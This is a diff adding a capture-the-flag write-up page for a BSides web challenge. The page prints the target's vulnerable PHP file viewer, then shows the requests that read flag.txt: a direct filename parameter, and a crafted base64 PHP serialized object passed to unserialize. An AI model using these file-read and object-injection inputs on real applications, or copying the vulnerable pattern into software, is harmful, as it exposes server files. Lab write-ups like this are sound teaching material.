@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+
+<html lang="en-US">
+
+  <!-- meta information of doc -->
+  <head>
+    <title>missing's corner</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="../../assets/css/main.css">
+    <link rel="stylesheet" type="text/css" href="../../code/code.css">
+    <link rel="icon" type="image/png" href="../../images/icon.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro' rel='stylesheet' type='text/css'>
+  </head>
+
+  <body>
+
+    <!-- banner at top of website -->
+    <picture>
+        <img src="../../images/banner.png" alt="Banner" style="width:100%;">
+    </picture>
+
+    <!-- navigation bar -->
+    <div class="navbar">
+        <a id="navleft" href="../../index.html">HOME</a>
+        <a id="navleft" href="../../writeups.html">WRITE-UPS</a>
+        <a id="navleft" href="../../code.html">CODE</a>
+        <a id="navleft" href="../../resources.html">RESOURCES</a>
+        <a id="navright" href="#">CREDITS</a>
+        <a id="navright" href="#">ABOUT</a>
+    </div>
+
+    <div class="card">
+
+        <!-- back button -->
+        <a href="../../writeups.html" class="button">Back</a>
+        
+    <!-- HTML content generated from markdown -->
+    <h1 id="undynamicnosql">Undynamic NoSQL</h1>
+
+    <p>Upon first viewing of the web page, we get this:</p>
+    
+    <p><img src="./1.png" alt="index" /></p>
+    
+    <p>The expected functionality is that the web page will display a file from the drop down list.</p>
+    
+    <p><img src="./2.png" alt="display" /></p>
+    
+    <h2 id="challengebegins">Challenge Begins</h2>
+    
+    <p>The first thing to do was view the page source where the following comments appeared:</p>
+    
+    <pre><code>&lt;!--&lt;option value="flag.txt"&gt;flag.txt&lt;/option&gt;--&gt;
+    &lt;!--&lt;option value="index.php"&gt;index.php&lt;/option&gt;--&gt;
+    </code></pre>
+    
+    <p>Modifying the GET request by changing the filename parameter value in the URL to access index.php showed:</p>
+    
+    <p>view-source://xx.xx.xx.xx/?filename=index.php</p>
+    
+    <pre><code>&lt;html&gt;
+    &lt;h1&gt;FileViewer&lt;/h1&gt;
+    &lt;form action="/"&gt;
+    &lt;select name="filename"&gt;
+    &lt;!--&lt;option value="."&gt;.&lt;/option&gt;--&gt;
+    &lt;!--&lt;option value=".."&gt;..&lt;/option&gt;--&gt;
+    &lt;option value=".htacccess"&gt;.htacccess&lt;/option&gt;
+    &lt;option value="DemoController.cs"&gt;DemoController.cs&lt;/option&gt;
+    &lt;option value="factorial.js"&gt;factorial.js&lt;/option&gt;
+    &lt;!--&lt;option value="flag.txt"&gt;flag.txt&lt;/option&gt;--&gt;
+    &lt;!--&lt;option value="index.php"&gt;index.php&lt;/option&gt;--&gt;
+    &lt;option value="main_test.go"&gt;main_test.go&lt;/option&gt;
+    &lt;option value="my.log"&gt;my.log&lt;/option&gt;
+    &lt;option value="setup.py"&gt;setup.py&lt;/option&gt;
+    &lt;/select&gt;
+    &lt;input type="submit" value="submit"&gt;
+    &lt;/form&gt;
+    &lt;p&gt;Want to save your File View? Bookmark this url: &lt;a href="/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czo5OiJpbmRleC5waHAiO30="&gt;Bookmark me!&lt;/a&gt;&lt;/p&gt;
+    &lt;?php&lt;br /&gt;
+    session_start();&lt;br /&gt;
+    //parse_str(implode('&amp;', array_slice($argv, 1)), $_GET);&lt;br /&gt;
+    ?&gt;&lt;br /&gt;
+    &lt;html&gt;&lt;br /&gt;
+    &lt;h1&gt;FileViewer&lt;/h1&gt;&lt;br /&gt;
+    &lt;?php&lt;br /&gt;
+    class FileViewer&lt;br /&gt;
+    {&lt;br /&gt;
+       var $filename = "";&lt;br /&gt;
+    &lt;br /&gt;
+       function __construct($filename)&lt;br /&gt;
+       {&lt;br /&gt;
+          $this-&gt;filename = $filename;&lt;br /&gt;
+       }&lt;br /&gt;
+    &lt;br /&gt;
+       function __toString()&lt;br /&gt;
+       {&lt;br /&gt;
+          if (!empty($this-&gt;filename))&lt;br /&gt;
+          {&lt;br /&gt;
+             return file_get_contents($this-&gt;filename);&lt;br /&gt;
+          }&lt;br /&gt;
+          else&lt;br /&gt;
+          {&lt;br /&gt;
+             return "No file!";&lt;br /&gt;
+          }&lt;br /&gt;
+       }&lt;br /&gt;
+    }&lt;br /&gt;
+    ?&gt;&lt;br /&gt;
+    &lt;form action="/"&gt;&lt;br /&gt;
+    &lt;select name="filename"&gt;&lt;br /&gt;
+    &lt;?php&lt;br /&gt;
+    $files = scandir(".");&lt;br /&gt;
+    foreach ($files as $f)&lt;br /&gt;
+    {&lt;br /&gt;
+       $select_val = "&lt;option value=\"" . $f . "\"&gt;" . $f . "&lt;/option&gt;";&lt;br /&gt;
+       if ($f == "." or $f == ".." or $f == "index.php" or $f == "flag.txt")&lt;br /&gt;
+       {&lt;br /&gt;
+          $select_val = "&lt;!--" . $select_val . "--&gt;";&lt;br /&gt;
+       }&lt;br /&gt;
+       echo $select_val . "\n";&lt;br /&gt;
+    }&lt;br /&gt;
+    ?&gt;&lt;br /&gt;
+    &lt;/select&gt;&lt;br /&gt;
+    &lt;input type="submit" value="submit"&gt;&lt;br /&gt;
+    &lt;/form&gt;&lt;br /&gt;
+    &lt;?php&lt;br /&gt;
+    $my_view = NULL;&lt;br /&gt;
+    if (isset($_GET["filename"]) and !empty($_GET["filename"]) and $_GET["filename"] != "flag.txt")&lt;br /&gt;
+    {&lt;br /&gt;
+       $my_view = new FileViewer($_GET["filename"]);&lt;br /&gt;
+       $my_view_b64 = base64_encode(serialize($my_view));&lt;br /&gt;
+       echo '&lt;p&gt;Want to save your File View? Bookmark this url: &lt;a href="/?view=' . $my_view_b64 . '"&gt;Bookmark me!&lt;/a&gt;&lt;/p&gt;';&lt;br /&gt;
+       echo "\n";&lt;br /&gt;
+    }&lt;br /&gt;
+    elseif (isset($_GET["view"]) and !empty($_GET["view"]))&lt;br /&gt;
+    {&lt;br /&gt;
+       $my_view = unserialize(base64_decode($_GET["view"]));&lt;br /&gt;
+    }&lt;br /&gt;
+    &lt;br /&gt;
+    if (isset($my_view) and !empty($my_view))&lt;br /&gt;
+    {&lt;br /&gt;
+       echo nl2br($my_view);&lt;br /&gt;
+    }&lt;br /&gt;
+    ?&gt;&lt;br /&gt;
+    &lt;/html&gt;&lt;br /&gt;
+    &lt;/html&gt;
+    </code></pre>
+    
+    <p>There appeared to be a bug in </p>
+    
+    <p><code>$select_val = "&lt;option value=\"" . $f . "\"&gt;" . $f . "&lt;/option&gt;";&lt;br /&gt;</code> </p>
+    
+    <p>which did not properly prevent access to index.php and directory traversal.</p>
+    
+    <p>Thus, the flag was accessible via editing the filename parameter like so: </p>
+    
+    <p>xx.xx.xx.xx/?filename=./flag.txt</p>
+    
+    <p>The less trivial and likely intended method for solving the challenge is demonstrated by the link saving functionality where the parameter is base64 encoded and passed instead.</p>
+    
+    <p>An example parameter:</p>
+    
+    <p>xx.xx.xx.xx/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czoxNzoiRGVtb0NvbnRyb2xsZXIuY3MiO30=</p>
+    
+    <p>Decoding the base64 encoded string showed the parameter in the following format:</p>
+    
+    <p><code>O:10:"FileViewer":1:{s:8:"filename";s:17:"DemoController.cs";}</code></p>
+    
+    <p>This format was used to write a parameter to access flag.txt:</p>
+    
+    <p><code>O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.txt";}</code></p>
+    
+    <p>Encoding it to base64 and passing it to the parameter provided access to the flag:</p>
+    
+    <p>xx.xx.xx.xx/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czo4OiJmbGFnLnR4dCI7fQ==</p>
+    
+    <p>BSidesSA{pea<em>8ch</em>pea<em>1s</em>gr34t}</p>
+    <!-- end of content -->
+
+    <!-- footer with contact info -->
+    <div class="footer">
+        <a href="https://github.com/whoismissing" class="fa fa-github"></a>
+        <a href="https://twitter.com/0xmissing" class="fa fa-twitter"></a>
+        <a href="#" class="fa fa-linkedin"></a>
+    </div>
+
+    </body>
+
+</html>
